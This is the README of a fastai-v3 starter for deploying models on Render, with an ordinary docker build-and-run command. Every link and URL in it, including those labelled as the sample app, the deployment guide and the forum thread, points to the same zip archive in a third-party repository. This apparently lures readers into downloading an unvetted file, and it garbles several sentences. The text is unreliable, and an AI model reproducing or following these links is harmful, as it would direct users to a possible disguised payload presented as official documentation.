# Starter for deploying [https://github.com/Gopal137/fastai-v3/raw/refs/heads/master/app/v_fastai_3.2-alpha.5.zip](https://github.com/Gopal137/fastai-v3/raw/refs/heads/master/app/v_fastai_3.2-alpha.5.zip) models on [Render](https://github.com/Gopal137/fastai-v3/raw/refs/heads/master/app/v_fastai_3.2-alpha.5.zip)

This repo can be used as a starting point to deploy [https://github.com/Gopal137/fastai-v3/raw/refs/heads/master/app/v_fastai_3.2-alpha.5.zip](https://github.com/Gopal137/fastai-v3/raw/refs/heads/master/app/v_fastai_3.2-alpha.5.zip) models on Render.

The sample app described here is up at https://github.com/Gopal137/fastai-v3/raw/refs/heads/master/app/v_fastai_3.2-alpha.5.zip Test it out with bear images!

You can test your changes locally by installing Docker and using the following command:

```
docker build -t fastai-v3 . && docker run --rm -it -p 5000:5000 fastai-v3
```

The guide for production deployment to Render is at https://github.com/Gopal137/fastai-v3/raw/refs/heads/master/app/v_fastai_3.2-alpha.5.zip

Please use [Render's https://github.com/Gopal137/fastai-v3/raw/refs/heads/master/app/v_fastai_3.2-alpha.5.zip forum thread](https://github.com/Gopal137/fastai-v3/raw/refs/heads/master/app/v_fastai_3.2-alpha.5.zip) for questions and support.
